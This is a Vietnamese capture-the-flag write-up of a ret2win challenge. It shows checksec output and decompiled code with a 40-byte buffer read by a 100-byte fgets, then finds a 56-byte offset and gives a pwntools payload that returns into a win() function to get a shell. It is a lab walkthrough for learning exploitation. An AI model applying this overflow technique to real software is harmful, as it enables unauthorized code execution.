# *Challenge : ret2win_chall*

***
- Kỹ thuật **ret2win** (return-to-win) trong PWN là một kỹ thuật khai thác đơn giản, thường dùng ở mức độ entry-level CTF để luyện tập return-oriented programming (ROP) và ghi đè return address.
- Các chế độ bảo vệ ảnh hưởng đến ret2win:

```
Cơ chế bảo vệ	Có bật ảnh hưởng đến      Ghi chú
                ret2win không?	        
NX	            ❌ Không                 Không dùng shellcode
Canary	        ✅ Có	                Không leak được → toang
PIE	            ✅ Có	                Phải leak base để tính win()
RELRO	        ❌ Không	                Không can thiệp GOT
ASLR	        ❌ Ít	                Không ảnh hưởng nếu không dùng libc
``` 

- Quay lại với file chall:
**Dùng checksec để kiểm tra:**
```
pwndbg> checksec
File:     /mnt/d/Documents/ISP/TASK1/1_ret2win/ret2win_chall
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x400000)
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
Debuginfo:  Yes
```

- No canary -> có thể buffer overflow
- No PIE -> địa chỉ các hàm là cố định (tĩnh) -> có thể dùng trực tiếp lệnh p &< func >
- Còn lại ko ảnh hưởng đến ret2win
* Xem pseudo code ở IDA xem, chương trình hoạt động ntn:
- Có 3 hàm chính: win(), vuln(), main():
Mô tả chương trình: tại hàm main() gọi hàm vuln(), tại vuln() khai báo buf[40], nhập buf và kết thúc chương trình
```c
    int __fastcall main(int argc, const char **argv,     const char **envp)
    {
    vuln();
    return 0;
    }
```
```c
    void __cdecl vuln()
    {
    char buf[40]; // [rsp+0h] [rbp-30h] BYREF

    printf("> ");
    fgets(buf, 100, _bss_start);
    }
```
```c
    void __cdecl win()
    {
    system("/bin/sh");
    }
```
- Mục tiêu: chiếm được ‘/bin/sh’ trong hàm win()
**Nhận diện ret2win:**
- chuỗi buf khai báo 40 phần tử mà fgets cho nhập 100 phần tử vào buf -> buffer overflow
- ta có thể tận dụng bof để ghi đè lên return address thành address của hàm win()
**Khai thác bằng pwndbg:**

*B1: Tìm offset để tràn từ buffer đến đúng địa chỉ ret.*
 + Nhảy đến hàm fgets, do fgets cho nhập tới 100 phần tử nên ta dùng lệnh cyclic 100 -> tạo chuỗi 100 chữ cái ko trùng nhau để nhập vào buffer
+ ni tiếp đến hàm return. Ta thấy ret đã bị overwrite thành địa chỉ khác
```
 ► 0x401192 <vuln+54>     ret                       <0x6161616161616168>
 ```
 
+ Ta sẽ tìm đc offset bằng cách dùng lệnh cyclic -l <address>
 
=> offset = 56
*B2: Do ko có cơ chế bảo vệ PIE nên ta có thể tìm địa chỉ hàm win() trực tiếp bằng p &< func >*
 ```pwndbg>
p &win
$1 = (void (*)()) 0x401146 <win>
```
=> win_addr = 0x401146 
(**Note:** với trường hợp PIE enable, ta nên tìm địa chỉ thực sự của win = lệnh exe.sym[‘win’]  )
* Viết payload bằng python:
```python
# PAYLOAD
    payload = flat(b'a'*56, 0x401146)

    p.sendline(payload)
    p.interactive()
```
- Thử gửi xem chiếm đc ‘/bin/sh’ chưa
->  Chương trình bị crash khi gửi payload (chưa chiếm đc shell)
- Thử debug động chương trình xem địa chỉ ret đã bị thay đổi chưa
-> đã đổi đc địa chỉ đến win nhưng khi vừa vào win ta thấy lỗi: địa chỉ stack 0x7fff9b0e4158 không chia hết cho 16 -> stack lẻ
 
Giải pháp: ta có thể nhảy trực tiếp vào hàm win() luôn, không cần là đầu hàm win()
-> cộng thêm địa chỉ của hàm win cho 5
Ta có payload mới
 ```python
# PAYLOAD
    payload = flat(b'a'*56, 0x401146 + 5)

    p.sendline(payload)
    p.interactive()
```
- Giờ gửi thử payload xem oke chưa
 ```
 $ python3 solve.py
[+] Starting local process '/mnt/d/Documents/ISP/TASK1/1_ret2win/ret2win_chall': pid 396
[*] Switching to interactive mode
$
$ whoami
d1nhdwc
$ ls
 ```
=> Đã chiếm đc shell
